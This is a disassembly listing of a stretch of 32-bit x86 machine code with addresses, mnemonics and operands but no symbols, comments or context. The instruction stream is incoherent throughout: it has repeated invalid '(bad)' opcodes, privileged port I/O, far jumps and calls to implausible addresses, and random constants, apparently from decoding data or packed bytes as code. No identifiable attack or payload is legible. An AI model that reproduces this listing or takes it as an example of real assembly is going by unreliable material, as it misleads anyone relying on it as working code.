  4074ba:	fisttp WORD PTR [ebp+0xb]
  4074bd:	retf   
  4074be:	not    BYTE PTR [ebx-0x1e83359d]
  4074c4:	out    0xec,eax
  4074c6:	cmc    
  4074c7:	push   cs
  4074c8:	in     al,dx
  4074c9:	adc    al,BYTE PTR ds:[esi]
	...
  4074e0:	bound  edx,QWORD PTR [ebx-0x3452d020]
  4074e6:	test   BYTE PTR [ebx-0x1e833490],0xa7
  4074ed:	shl    ch,1
  4074ef:	out    0xcb,al
  4074f1:	retf   
  4074f2:	jl     0x4074d1
  4074f4:	ret    
  4074f5:	inc    ecx
  4074f6:	add    cl,al
  4074f8:	mov    ecx,0xc1cef70d
  4074fd:	(bad)  
  4074fe:	or     ebp,ecx
  407500:	inc    esp
  407501:	push   ds
  407502:	in     al,0xbe
  407504:	in     eax,0x9e
  407506:	loopne 0x4074b5
  407508:	push   eax
  407509:	retf   
  40750a:	mul    dl
  40750c:	dec    edi
  40750d:	inc    eax
  40750e:	inc    esi
  40750f:	adc    DWORD PTR [ebp+0x62],esi
  407512:	dec    ecx
  407513:	jmp    0xa9982837
  407518:	cmp    ecx,ebx
  40751a:	push   edi
  40751b:	cmp    DWORD PTR [eax],ebx
  40751d:	xor    ecx,DWORD PTR [eax]
  40751f:	add    BYTE PTR [ebp+0x1568b639],dh
  407525:	add    cl,BYTE PTR [eax+0x0]
  407528:	xchg   ebp,eax
  407529:	imul   edi,DWORD PTR [ebp+0x8],0xd
  40752d:	test   eax,0x832ffed
  407532:	outs   dx,DWORD PTR ds:[esi]
  407533:	add    DWORD PTR [ebp+0x5268b639],esi
  407539:	add    cl,BYTE PTR [eax+0x0]
  40753c:	aad    0x69
  40753e:	jge    0x407548
  407540:	fnstsw WORD PTR [ebx-0x13]
  407543:	inc    DWORD PTR [eax]
	...
  407555:	add    BYTE PTR [eax],al
  407557:	add    dl,al
  407559:	or     BYTE PTR [edi+0x2],ch
  40755c:	cmp    esi,DWORD PTR gs:[esi+0x4802a068]
  407563:	add    BYTE PTR ds:0x7d087d6b,ah
  407569:	mov    edi,0x3882ffeb
  40756e:	adc    bh,BYTE PTR [edx+eax*4+0x3dc2c169]
  407575:	xchg   esi,eax
  407576:	pop    ebp
  407577:	mov    edx,DWORD PTR [ecx+0xffccc15]
  40757d:	xchg   esi,eax
  40757e:	bound  ecx,QWORD PTR [ecx]
  407580:	and    ch,ch
  407582:	push   cs
  407583:	call   0x379cf9
  407588:	pushf  
  407589:	fdivr  st(2),st
  40758b:	push   0x1f
  40758d:	imul   edi,DWORD PTR [ebp+0x8],0x4d
  407591:	push   ss
  407592:	idiv   edi
  407594:	sar    BYTE PTR [ebx-0x674700d7],cl
  40759a:	loopne 0x407612
  40759c:	inc    edx
  40759d:	imul   esi,edi,0x6a
  4075a0:	shr    DWORD PTR [edx+0x7d],0x8
  4075a4:	std    
  4075a5:	mov    ecx,0x6b02fff5
  4075aa:	jge    0x4075a8
  4075ac:	mov    WORD PTR [edx],fs
  4075ae:	rol    BYTE PTR [edi],1
  4075b0:	in     al,0x81
  4075b2:	xchg   ebp,eax
  4075b3:	dec    ebx
  4075b5:	add    al,0x49
  4075b7:	add    al,0x8c
  4075b9:	mov    al,ds:0xec83
	...
  4075ce:	add    BYTE PTR [eax],al
  4075d0:	es mov ebx,0x7c5b39e2
  4075d6:	or     al,0x68
  4075d8:	je     0x4075e4
  4075da:	int3   
  4075db:	jmp    DWORD PTR [edx+0x4d4834a0]
  4075e1:	mov    ebx,0x5ad2d262
  4075e6:	push   esi
  4075e7:	or     ecx,DWORD PTR [edi+eax*1-0x10]
  4075eb:	dec    edi
  4075ec:	add    DWORD PTR [eax],0xfffffffb
  4075ef:	inc    BYTE PTR [ecx]
  4075f1:	mov    al,0xba
  4075f3:	(bad)  
  4075f4:	stc    
  4075f5:	mov    bl,0x62
  4075f7:	cwde   
  4075f8:	jo     0x40766c
  4075fa:	push   esi
  4075fb:	call   0xff96ac2d
  407600:	out    0xbb,al
  407602:	loop   0x40763d
  407604:	mov    ebx,0x74680afc
  407609:	sub    cl,ah
  40760b:	jmp    FWORD PTR [ebx+0xc000abd]
  407611:	xchg   ebx,eax
  407612:	stos   BYTE PTR es:[edi],al
  407613:	mov    esi,0xc000ba33
  407618:	mov    al,ds:0x99febac8
  40761d:	retf   
  40761e:	push   ebx
  40761f:	jne    0x4075a9
  407621:	mov    edx,DWORD PTR [ebp+0x75]
  407624:	test   bl,dl
  407626:	loop   0x40760b
  407628:	or     edx,edx
  40762a:	arpl   WORD PTR [edx+0x47],si
  40762d:	or     dl,BYTE PTR [ebp-0x1]
  407630:	sub    ebx,0x7553
	...
  407646:	add    BYTE PTR [eax],al
  407648:	adc    BYTE PTR [ebx-0xa],0x56
  40764c:	dec    ebp
  40764d:	xchg   esp,eax
  40764e:	loope  0x4076ac
  407650:	pop    ecx
  407651:	pushf  
  407652:	cdq    
  407653:	xor    al,0xc8
  407656:	popf   
  407657:	dec    ebx
  407658:	into   
  407659:	xchg   edi,eax
  40765a:	loope  0x407612
  40765c:	push   ss
  40765d:	mov    eax,0x3dc04861
  407662:	loope  0x40764d
  407664:	test   ecx,ecx
  407666:	repz or esp,DWORD PTR [edx+edx*1+0x1aab5d39]
  40766e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40766f:	pop    edi
  407670:	xor    al,0x94
  407672:	loope  0x4076e0
  407674:	fidivr DWORD PTR [ebx]
  407676:	call   0x46d4c32f
  40767b:	xlat   BYTE PTR ds:[ebx]
  40767c:	xchg   ebx,eax
  40767d:	mov    esp,0xc8835cc0
  407682:	fadd   DWORD PTR [edx]
  407684:	mov    WORD PTR [edi+0x5f9fec7e],?
  40768a:	mov    al,ds:0xf9426b03
  40768f:	imul   edx,edx,0xffffffc7
  407692:	adc    eax,0x1d425b5d
  407697:	pop    ebp
  407698:	fstp   DWORD PTR [ecx+ecx*1+0xdc80477]
  40769f:	dec    ebx
  4076a0:	dec    esi
  4076a1:	xchg   ecx,eax
  4076a2:	loope  0x40765a
  4076a4:	push   es
  4076a5:	mov    ecx,0xc054485f
  4076aa:	in     eax,0x5c
	...
  4076c0:	sbb    DWORD PTR [edx-0x13],edx
  4076c3:	mov    bl,0x22
  4076c5:	inc    edx
  4076c6:	in     eax,0x5c
  4076c8:	popa   
  4076c9:	in     al,dx
  4076ca:	sub    bl,al
  4076cc:	adc    esi,DWORD PTR [eax-0x6b735af6]
  4076d2:	cli    
  4076d3:	inc    ebx
  4076d4:	xchg   ebx,eax
  4076d5:	adc    DWORD PTR [ecx+0x8948c02],ebp
  4076db:	scas   al,BYTE PTR es:[edi]
  4076dc:	retf   0x7bf
  4076df:	jmp    0x2d100b73
  4076e4:	inc    esp
  4076e5:	(bad)  
  4076e6:	push   cs
  4076e7:	jmp    0x348b17b
  4076ec:	mov    BYTE PTR [edx],bh
  4076ee:	or     BYTE PTR [ebx],al
  4076f0:	nop
  4076f1:	sbb    DWORD PTR [ebp+0x7d],ecx
  4076f4:	call   FWORD PTR [eax]
  4076f6:	lea    esi,[ebp+0x60]
  4076f9:	(bad)  
  4076fa:	neg    BYTE PTR [ecx]
  4076fc:	push   ecx
  4076fd:	inc    ecx
  4076fe:	lock outs dx,BYTE PTR ds:[esi]
  407700:	ret    0xdfcb
  407703:	gs jmp 0x50327f9d
  407709:	inc    eax
  40770a:	or     eax,0x8951440
  40770f:	jmp    0xa8807a8b
  407714:	pop    edi
  407716:	jl     0x407705
  407718:	out    0x59,eax
  40771a:	mov    dh,0x36
  40771c:	shl    BYTE PTR [ebx+eax*4+0x19],1
  407720:	sbb    dl,BYTE PTR [ecx]
  407722:	cld    
  407723:	push   ds
	...
  407738:	rol    bh,0x57
  40773b:	mov    ebx,0x16b689e7
  407740:	mov    al,0x1d
  407742:	lea    ebx,[ecx]
  407744:	loopne 0x40770d
  407746:	not    BYTE PTR [ecx]
  407748:	mov    esp,0x24fef70a
  40774d:	(bad)  
  40774e:	outs   dx,BYTE PTR ds:[esi]
  40774f:	pop    esp
  407750:	clc    
  407751:	push   ebx
  407752:	or     dh,ch
  407754:	add    esp,eax
  407756:	(bad)  
  407757:	out    0xc7,al
  407759:	(bad)  
  40775a:	cmp    al,0xc1
  40775c:	dec    eax
  40775d:	push   esp
  40775e:	or     cl,al
  407760:	fwait
  407761:	or     edi,esi
  407763:	into   
  407764:	sbb    DWORD PTR [ecx],edx
  407766:	in     al,dx
  407767:	add    BYTE PTR [edx+0x6b],al
  40776a:	imul   DWORD PTR [edx-0x1b]
  40776d:	mov    edx,0x90a457ad
  407772:	div    DWORD PTR [ebp-0x89cdb]
  407778:	sub    ah,BYTE PTR [ebp-0x6f5bb730]
  40777e:	loopne 0x4077f5
  407780:	cmp    BYTE PTR [ebx-0x9],ch
  407783:	mov    DWORD PTR [eax],esi
  407785:	cmp    al,0xff
  407787:	dec    DWORD PTR [edx]
  407789:	mov    dh,0xf6
  40778b:	addr16 pop ebx
  40778d:	add    ecx,DWORD PTR [eax+0x0]
  407790:	cmp    ah,BYTE PTR ds:0x6b3af7f8
  407796:	div    DWORD PTR ds:0x47d84d
	...
  4077b0:	cmp    eax,0x3affb403
  4077b5:	sbb    DWORD PTR [ebp-0x8961d18],ecx
  4077bb:	push   0x75
  4077bd:	mov    edx,0x922457a6
  4077c2:	div    DWORD PTR [ebp-0x89e4b]
  4077c8:	mov    edx,0x3448d0a3
  4077cd:	xchg   edx,eax
  4077ce:	loopne 0x407809
  4077d0:	mov    eax,0xe089f769
  4077d5:	xor    bh,bh
  4077d7:	call   FWORD PTR [edx+0x42d88d1b]
  4077dd:	imul   esi,edi,0x50
  4077e0:	sbb    eax,0x25415f28
  4077e5:	imul   edi,DWORD PTR [ebp-0x894dd10],0xffffffff
  4077ec:	or     BYTE PTR [eax+0x3a254140],0x1e
  4077f3:	mov    ebp,0xb51de8c
  4077f8:	int3   
  4077f9:	pop    edi
  4077fa:	cmc    
  4077fb:	add    BYTE PTR [ecx-0xc],0x59
  4077ff:	(bad)  
  407800:	sti    
  407801:	scas   eax,DWORD PTR es:[edi]
  407802:	xlat   BYTE PTR ds:[ebx]
  407803:	psllq  mm1,mm3
  407806:	add    DWORD PTR [ebp-0xae0138],0xb96e233c
  407810:	(bad)  [esi]
  407812:	data16 adc al,0x0
	...
  407825:	add    BYTE PTR [eax],al
  407827:	add    BYTE PTR [edi+0x5c05c6fb],al
  40782d:	adc    edi,DWORD PTR [edx]
  40782f:	mov    ecx,0x854a0ec3
  407834:	fdivr  DWORD PTR [esi]
  407836:	push   edx
  407837:	call   FWORD PTR [ecx+0xf000abb]
  40783d:	jns    0x407896
  40783f:	mul    DWORD PTR [ebx+0x31740b2e]
  407845:	cmp    dl,BYTE PTR [eax+0x525e9bec]
  40784b:	add    BYTE PTR [eax],al
  40784d:	clc    
  40784e:	lea    edi,[ebp-0xad798c]
  407854:	mov    edi,?
  407856:	mov    ebp,0x61bb8c67
  40785b:	mov    esi,0xe803006b
  407860:	mov    edx,0x5bff5265
  407865:	pusha  
  407866:	outs   dx,DWORD PTR ds:[esi]
  407867:	not    DWORD PTR [ebx-0x62]
  40786a:	push   edx
  40786b:	jne    0x407801
  40786d:	xchg   ebx,eax
  40786e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40786f:	mov    dh,0x43
  407871:	mov    ss,WORD PTR [edx-0x4b]
  407874:	and    al,0xbe
  407876:	push   eax
  407877:	push   DWORD PTR [ebx]
  407879:	dec    eax
  40787a:	add    ebp,eax
  40787c:	or     BYTE PTR [ebp+0x52],bh
  40787f:	jmp    DWORD PTR [ebx]
  407881:	xchg   esp,eax
  407882:	xchg   esp,eax
  407883:	pusha  
  407884:	and    eax,ebp
  407886:	aad    0x59
  407888:	cdq    
  407889:	pushf  
  40788a:	leave  
  40788b:	mov    al,BYTE PTR [eax]
	...
  40789d:	add    BYTE PTR [eax],al
  40789f:	add    BYTE PTR [edx-0x3b],al
  4078a2:	lds    ebx,FWORD PTR [ecx+0x39]
  4078a5:	mov    ah,0xb5
  4078a7:	pop    ecx
  4078a8:	sti    
  4078a9:	les    edi,FWORD PTR [ebx]
  4078ab:	or     al,0xe4
  4078ad:	adc    esi,DWORD PTR [edi+0x59]
  4078b0:	jmp    0x407876
  4078b2:	jnp    0x4078ec
  4078b4:	fcmovnb st,st(4)
  4078b6:	lods   eax,DWORD PTR ds:[esi]
  4078b7:	pop    ecx
  4078b8:	popa   
  4078b9:	pushf  
  4078ba:	cdq    
  4078bb:	hlt    
  4078bc:	sbb    ebp,eax
  4078be:	popf   
  4078bf:	pop    ecx
  4078c0:	add    DWORD PTR [eax-0x443ca663],esi
  4078c6:	adc    al,0x9b
  4078c8:	mov    ebx,0xa08f75c4
  4078cd:	mov    esp,0x5ab4597d
  4078d2:	cmp    BYTE PTR [ecx-0x5d],bl
  4078d5:	les    edx,FWORD PTR [ebx+0x55c4a36c]
  4078db:	ins    BYTE PTR es:[edi],dx
  4078dc:	push   edx
  4078dd:	or     ebx,DWORD PTR [esi+0x59]
  4078e0:	mov    ecx,DWORD PTR [edx]
  4078e2:	inc    ecx
  4078e3:	push   ecx
  4078e4:	add    esp,0x58
  4078e7:	adc    eax,0x5935c435
  4078ec:	cmp    ebp,eax
  4078ee:	xor    eax,0x8ad6b59
  4078f3:	fwait
  4078f4:	arpl   sp,ax
  4078f6:	sub    eax,0xddae63bf
  4078fb:	pop    ecx
  4078fc:	push   ebx
  4078fd:	les    ebx,FWORD PTR ds:0xacad47cf
  407903:	sahf   
	...
  407918:	mov    WORD PTR [eax+edi*1-0x636b7bba],ss
  40791f:	mov    WORD PTR [eax],fs
  407921:	sbb    BYTE PTR [eax],cl
  407923:	sub    eax,0x83082ec8
  407928:	nop
  407929:	ret    
  40792a:	jl     0x40791d
  40792c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40792d:	jle    0x4078ed
  40792f:	fidiv  WORD PTR [ebp+ecx*1+0x5a12d54d]
  407936:	lock cmp eax,esi
  407939:	pop    ebp
  40793a:	pop    edi
  40793b:	sub    BYTE PTR [eax-0x30e9b1d4],dl
  407941:	ret    
  407942:	cmc    
  407943:	cld    
  407944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407945:	dec    esp
  407946:	dec    ecx
  407947:	jmp    0xa6f33bc3
  40794c:	xor    al,0x8f
  40794e:	enter  0xdd15,0x53
  407952:	pusha  
  407953:	call   0x8ef62ce7
  407958:	ror    bl,cl
  40795a:	push   edi
  40795b:	xchg   dl,cl
  40795d:	fwait
  40795e:	loopne 0x4079d1
  407960:	jne    0x407925
  407962:	test   BYTE PTR [ecx+0x6ef6fc58],0xa
  407969:	pop    edx
  40796a:	lock mov ecx,0xa85f2ca7
  407970:	(bad)  
  407971:	sub    al,0x4e
  407973:	mov    esi,0x14f5c34e
  407978:	ror    BYTE PTR [ecx+ecx*2-0x17],0x0
	...
  40798d:	add    BYTE PTR [eax],al
  40798f:	add    bh,ah
  407991:	into   
  407992:	mov    dl,0x3e
  407994:	aam    0x8f
  407996:	enter  0x5cbd,0x53
  40799a:	pusha  
  40799b:	jmp    0x40792c
  40799d:	mov    bl,0xb5
  40799f:	es dec edx
  4079a1:	retf   
  4079a2:	push   edi
  4079a3:	push   ds
  4079a4:	inc    edx
  4079a5:	fwait
  4079a6:	loopne 0x407965
  4079a8:	test   ebx,eax
  4079aa:	test   BYTE PTR [ecx],0xbc
  4079ad:	cld    
  4079ae:	test   BYTE PTR [eax],0x92
  4079b1:	scas   eax,DWORD PTR es:[edi]
  4079b2:	outs   dx,DWORD PTR ds:[esi]
  4079b3:	push   edi
  4079b4:	in     al,0x96
  4079b6:	div    DWORD PTR [ebp+0x2d]
  4079b9:	das    
  4079ba:	jg     0x4079b9
  4079bc:	xor    ch,BYTE PTR [ebx-0x9]
  4079bf:	jne    0x4079f2
  4079c1:	imul   edi,DWORD PTR [ebp+0x8],0x3d
  4079c5:	pop    ebp
  4079c6:	mov    ebp,0xca50e2ff
  4079cb:	add    al,0xf5
  4079cd:	add    eax,DWORD PTR [edx-0x2bab9b14]
  4079d3:	div    DWORD PTR [edx]
  4079d5:	imul   eax,DWORD PTR [ebp-0x9f7debb],0x75
  4079dc:	shr    DWORD PTR [ecx+0x3d],0xd8
  4079e0:	popf   
  4079e1:	fdecstp 
  4079e3:	out    0x57,eax
  4079e5:	hlt    
  4079e6:	pop    es
  4079e7:	add    BYTE PTR [esi-0xb7af8aa],ch
  4079ed:	cwde   
  4079ee:	or     BYTE PTR [eax],al
  4079f0:	jmp    0x0:0xfed4
	...
  407a07:	add    BYTE PTR [ebp+0x78c70896],ah
  407a0d:	test   DWORD PTR fs:[edi],0x6296b5
  407a14:	mov    edi,0xbf006296
  407a19:	xchg   esi,eax
  407a1a:	test   DWORD PTR [ebp-0x17],eax
  407a1d:	or     BYTE PTR [ebp+eax*4-0x8ae27],al
  407a24:	adc    eax,0xb2f87d6b
  407a29:	jecxz  0x407a1d
  407a2b:	call   0x489c89
  407a30:	outs   dx,BYTE PTR ds:[esi]
  407a31:	push   esi
  407a32:	jl     0x407a39
  407a34:	jl     0x407a4a
  407a36:	or     DWORD PTR [eax],eax
  407a38:	gs scas al,BYTE PTR es:[edi]
  407a3a:	mov    edx,0xaec8c48
  407a3f:	(bad)  
  407a40:	mov    ecx,0xf7b562df
  407a45:	call   0x8581:0x9c07505f
  407a4c:	and    bl,al
  407a4e:	pop    ebp
  407a4f:	(bad)  
  407a50:	mov    esp,0xd7a5631d
  407a55:	mov    edx,0xdc09895d
  407a5a:	inc    ebp
  407a5b:	dec    DWORD PTR [ebx]
  407a5d:	aam    0x51
  407a5f:	mov    bh,0x3
  407a61:	shl    eax,cl
  407a63:	push   DWORD PTR [ebx+0x21]
  407a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a67:	inc    eax
  407a68:	mov    WORD PTR [edx],es
  407a6a:	cwde   
  407a6b:	lock add BYTE PTR [eax],al
	...
  407a7e:	add    BYTE PTR [eax],al
  407a80:	jecxz  0x407a8c
  407a82:	pop    esi
  407a83:	call   FWORD PTR [ecx-0x73bf3cdd]
  407a89:	and    edx,DWORD PTR [edx-0x46]
  407a8c:	shl    DWORD PTR [edx],cl
  407a8e:	test   BYTE PTR [ebp-0xa1dd50],al
  407a94:	ss stos DWORD PTR es:[edi],eax
  407a96:	loop   0x407a56
  407a98:	arpl   WORD PTR [esp+ecx*1-0x1],bp
  407a9c:	stc    
  407a9d:	cmp    eax,DWORD PTR [esi-0x1]
  407aa0:	stos   DWORD PTR es:[edi],eax
  407aa1:	dec    edx
  407aa2:	sbb    al,bl
  407aa4:	push   esp
  407aa5:	ins    BYTE PTR es:[edi],dx
  407aa6:	or     al,0xe8
  407aa8:	mov    ecx,0x5ff5df5
  407aad:	cmp    DWORD PTR [edi-0x9],ebp
  407ab0:	mov    ebp,DWORD PTR [edx-0x1f]
  407ab3:	(bad)  
  407ab4:	jmp    0x407b29
  407ab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ab7:	inc    eax
  407ab8:	mov    WORD PTR [edx-0x68],ds
  407abb:	lock jnp 0x407a40
  407abe:	pop    esi
  407abf:	jmp    DWORD PTR [ecx-0x73bf3c5d]
  407ac5:	push   ebx
  407ac6:	sahf   
  407ac7:	mov    edx,0x8c2e945b
  407acc:	or     DWORD PTR [ebp+ebx*1-0x1ed1b4aa],esi
  407ad3:	jmp    0x407b25
  407ad5:	imul   esp,DWORD PTR [eax-0xef8c4fd],0xf5c1334d
  407adf:	cmove  ecx,DWORD PTR [eax+eiz*4+0x3]
	...
  407af8:	xor    al,0xf3
  407afa:	cmp    dl,BYTE PTR [esi+0x1b]
  407afd:	or     esp,DWORD PTR [esp+ebp*2+0x1b]
  407b01:	rcl    ebp,0xea
  407b04:	or     edi,DWORD PTR [ecx]
  407b06:	mov    esi,0xc6944cad
  407b0b:	(bad)  
  407b0c:	cld    
  407b0d:	enter  0x55cd,0xf3
  407b11:	xchg   BYTE PTR [ecx-0x366bb334],ch
  407b17:	and    DWORD PTR [esi],0x118ba5c1
  407b1d:	loopne 0x407ab4
  407b1f:	push   ebp
  407b20:	rcl    DWORD PTR [esp+edx*2],cl
  407b23:	pusha  
  407b24:	ret    
  407b25:	rcr    BYTE PTR [ebp+0x62373804],0x97
  407b2c:	test   al,0xc8
  407b2e:	lea    edx,[ebp-0x74]
  407b31:	dec    eax
  407b32:	adc    eax,0x75abe981
  407b37:	push   ebp
  407b38:	mov    ds:0x33b0fd93,eax
  407b3d:	xchg   esp,eax
  407b3e:	loope  0x407ba4
  407b40:	rol    al,cl
  407b42:	fisttp DWORD PTR [ebx]
  407b44:	je     0x407af5
  407b46:	xchg   ecx,eax
  407b47:	push   ebp
  407b48:	add    eax,0xffffff9b
  407b4b:	push   0x554dc083
  407b50:	stc    
  407b51:	mov    WORD PTR [ecx-0x3e],ds
  407b54:	pop    ds
  407b55:	rol    BYTE PTR [edi],0x36
  407b58:	mov    ecx,0x36e009
	...
  407b6d:	add    BYTE PTR [eax],al
  407b6f:	add    cl,al
  407b71:	mov    edi,0xac879cf6
  407b76:	cmp    edx,DWORD PTR [ebp-0x1f]
  407b79:	mov    edi,0xc7ac5cf6
  407b7e:	test   BYTE PTR [esi],0xe1
  407b81:	dec    ecx
  407b82:	add    BYTE PTR [ecx],dl
  407b84:	xchg   edx,eax
  407b85:	or     bh,dh
  407b87:	inc    al
  407b89:	or     eax,ebp
  407b8b:	(bad)  
  407b8c:	mov    eax,0x8774f6bf
  407b91:	lods   al,BYTE PTR ds:[esi]
  407b92:	setge  BYTE PTR [eax-0x3c6b0941]
  407b99:	(bad)  
  407b9a:	not    dh
  407b9c:	pop    eax
  407b9d:	dec    ecx
  407b9e:	add    cl,al
  407ba0:	test   DWORD PTR [eax],ecx
  407ba2:	test   esi,0xb6ec0958
  407ba8:	inc    eax
  407ba9:	mov    edi,0xc011c5df
  407bae:	imul   BYTE PTR [esi-0x59014ef6]
  407bb4:	cmp    BYTE PTR [eax+ebp*8-0x9409fa9],ch
  407bbb:	pop    esp
  407bbc:	aaa    
  407bbd:	(bad)  
  407bbe:	test   BYTE PTR [esi-0x794219d9],0x58
  407bc5:	mov    edi,0xbf5889bc
  407bca:	test   BYTE PTR [ecx+0x6ef70654],0x40
  407bd1:	or     esp,edx
  407bd3:	pop    esi
	...
  407be8:	cmp    BYTE PTR [edi-0x40e6d621],bh
  407bee:	not    BYTE PTR [esi+0x12]
  407bf1:	(bad)  
  407bf2:	dec    BYTE PTR [esi-0x20]
  407bf5:	mov    edi,0x2b7d007c
  407bfa:	aas    
  407bfb:	(bad)  
  407bfc:	stos   BYTE PTR es:[edi],al
  407bfd:	push   0x50a5b5f7
  407c02:	idiv   edi
  407c04:	int    0x20
  407c06:	mov    esi,0x4d68aaff
  407c0b:	clc    
  407c0c:	pushf  
  407c0d:	fxtract 
  407c0f:	call   FWORD PTR [edx-0x72038298]
  407c15:	push   esp
  407c16:	stos   BYTE PTR es:[edi],al
  407c17:	add    BYTE PTR ds:0x3508ca4a,ah
  407c1d:	out    dx,al
  407c1e:	sub    esp,0x6af47fb6
  407c24:	and    eax,0xb0ff02ad
  407c29:	shr    dh,0xb9
  407c2c:	es arpl di,si
  407c2f:	mov    DWORD PTR [eax-0x3d149f9c],esi
  407c35:	fdecstp 
  407c37:	(bad)  
  407c38:	mov    al,0xc0
  407c3a:	out    dx,al
  407c3b:	imul   BYTE PTR [eax]
  407c3d:	arpl   di,si
  407c3f:	jmp    DWORD PTR [eax-0x128a089c]
  407c45:	pop    edx
  407c46:	in     al,dx
  407c47:	mov    bl,0x2a
  407c49:	arpl   cx,ax
  407c4b:	ret    0x0
	...
  407c5e:	add    BYTE PTR [eax],al
  407c60:	mov    cl,0x92
  407c62:	pop    ebp
  407c63:	mov    ecx,DWORD PTR [ecx]
  407c65:	sbb    esp,ecx
  407c67:	shl    BYTE PTR [edx],1
  407c69:	arpl   di,si
  407c6b:	lea    esp,[eax+0x64]
  407c6e:	pop    eax
  407c6f:	jmp    DWORD PTR [eax-0x2ca0a42]
  407c75:	inc    DWORD PTR [edi+0x0]
  407c78:	or     eax,0xa500a8d1
  407c7d:	mov    ebp,0x8ef00fb6
  407c82:	or     al,BYTE PTR [eax]
  407c84:	mov    WORD PTR [ebx-0x538bbabf],gs
  407c8a:	or     al,BYTE PTR [eax]
  407c8c:	mov    WORD PTR [esi-0x3f],gs
  407c8f:	repz imul esi,DWORD PTR [edi-0x5409fff6],0xffffffd4
  407c97:	jmp    ebp
  407c99:	stos   DWORD PTR es:[edi],eax
  407c9a:	aam    0xff
  407c9c:	add    cl,dh
  407c9e:	pop    esi
  407c9f:	push   eax
  407ca0:	sbb    DWORD PTR [ecx],edi
  407ca2:	push   eax
  407ca3:	test   DWORD PTR [ebx-0x59],0xa3c1febc
  407caa:	pop    ebx
  407cab:	jne    0x407cdd
  407cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cae:	mov    bh,0xa1
  407cb0:	mov    WORD PTR [ebx-0x4f67400b],gs
  407cb6:	push   ebx
  407cb7:	std    
  407cb8:	lea    ebp,[ebx-0x7c2797f6]
  407cbe:	int    0xff
  407cc0:	or     ch,BYTE PTR [ecx+0x8]
  407cc3:	call   0x407cc8
	...
  407cd8:	and    BYTE PTR ds:0xfc07ff5a,ah
  407cde:	xchg   DWORD PTR [ebp-0xa60108],eax
  407ce4:	cmp    al,0x99
  407ce6:	push   esp
  407ce7:	loope  0x407d0e
  407ce9:	pop    es
  407cea:	pop    edx
  407ceb:	mov    DWORD PTR [ecx],edx
  407ced:	cld    
  407cee:	push   ecx
  407cef:	call   ebx
  407cf1:	mov    eax,ds:0x5353680c
  407cf6:	int    0xff
  407cf8:	ret    0x5b60
  407cfb:	idiv   DWORD PTR [ebx-0x2bcaa5f2]
  407d01:	or     ebp,0xffffffff
  407d04:	mov    bl,0x23
  407d06:	cmp    edi,0xffffffa3
  407d09:	xor    al,0x80
  407d0b:	in     al,0xa3
  407d0d:	cs pop edx
  407d0f:	push   0xffffff8c
  407d11:	xchg   esp,eax
  407d12:	(bad)  [ebx]
  407d14:	in     al,0x53
  407d16:	loope  0x407d6a
  407d18:	cmp    esp,eax
  407d1a:	push   ebp
  407d1b:	push   edx
  407d1c:	jnp    0x407cdb
  407d1e:	sbb    ebp,DWORD PTR [esp+eax*8]
  407d21:	push   ebx
  407d22:	loope  0x407d7f
  407d24:	push   esi
  407d25:	cld    
  407d26:	xor    eax,0x4d171552
  407d2b:	pop    edx
  407d2c:	pop    ebx
  407d2d:	mov    ebp,0x7fe403ca
  407d32:	leave  
  407d33:	les    ecx,FWORD PTR [ebx-0x42]
  407d36:	pop    ebx
  407d37:	push   ebx
  407d38:	cmp    edi,DWORD PTR [ebp+0x521d]
	...
  407d4e:	add    BYTE PTR [eax],al
  407d50:	sbb    esp,0xb533c4a8
  407d56:	pop    esp
  407d57:	mov    ebp,DWORD PTR [ebx]
  407d59:	mov    ebp,0xc5348877
  407d5e:	std    
  407d5f:	push   ecx
  407d60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d61:	xchg   esp,eax
  407d62:	mov    DWORD PTR [ebp+0x50e153bb],edi
  407d68:	inc    ecx
  407d69:	(bad)  
  407d6a:	fst    QWORD PTR [ecx+0x3]
  407d6d:	mov    ebp,0x53442c13
  407d72:	loope  0x407dcf
  407d74:	add    bh,ah
  407d76:	int    0x51
  407d78:	adc    eax,0xe359c117
  407d7d:	mov    esp,0xc4c0876b
  407d82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d83:	push   ecx
  407d84:	cmp    al,0x2c
  407d86:	and    ebp,DWORD PTR [esp+ecx*2-0x4368696c]
  407d8d:	les    ebx,FWORD PTR [ebp-0x467944af]
  407d93:	mov    esp,0xdd99944c
  407d98:	jecxz  0x407d56
  407d9a:	jne    0x407d99
  407d9c:	jecxz  0x407de5
  407d9e:	or     al,dl
  407da0:	adc    bh,bh
  407da2:	(bad)  [esi+0x3d]
  407da5:	mov    ebp,0xbb7fdc0b
  407daa:	aaa    
  407dab:	outs   dx,BYTE PTR ds:[esi]
  407dac:	or     ebx,ecx
  407dae:	(bad)  
  407daf:	push   esi
  407db0:	frstor [eax+eiz*8+0x11]
	...
  407dc8:	sbb    edi,DWORD PTR [esi+esi*8-0x37709bae]
  407dcf:	mov    ch,0x95
  407dd1:	fs loopne 0x407dd9
  407dd4:	add    edi,DWORD PTR [esi+esi*8-0x126f4da]
  407ddb:	frstor es:[ecx+0x98fe908]
  407de2:	lea    edi,[ecx]
  407de4:	aad    0xbb
  407de6:	idiv   BYTE PTR [ecx-0x57afb4a9]
  407dec:	(bad)  
  407ded:	mov    ebx,0xbbc4f9bc
  407df2:	div    dh
  407df4:	sbb    ah,0x3f
  407df7:	test   al,0x8f
  407df9:	lods   al,BYTE PTR ds:[esi]
  407dfa:	adc    al,0xa1
  407dfc:	pop    esp
  407dfd:	mov    ebx,0xc3b76480
  407e02:	not    dh
  407e04:	adc    dl,bh
  407e06:	jmp    0x407dde
  407e08:	pop    esp
  407e09:	mov    ebx,0x2013f607
  407e0e:	or     cl,ch
  407e10:	(bad)  
  407e11:	pop    ss
  407e12:	mov    ch,0xc5
  407e14:	xor    al,0xbb
  407e16:	imul   cl
  407e18:	mov    WORD PTR [eax],ss
  407e1a:	xchg   cl,ch
  407e1c:	(bad)  
  407e1d:	xchg   esp,eax
  407e1e:	mov    ebx,DWORD PTR [edi+eiz*2-0x3d]
  407e22:	not    BYTE PTR [esi+0x688c8b8f]
  407e28:	(bad)  
  407e29:	xchg   esp,eax
  407e2a:	or     BYTE PTR [eax],al
	...
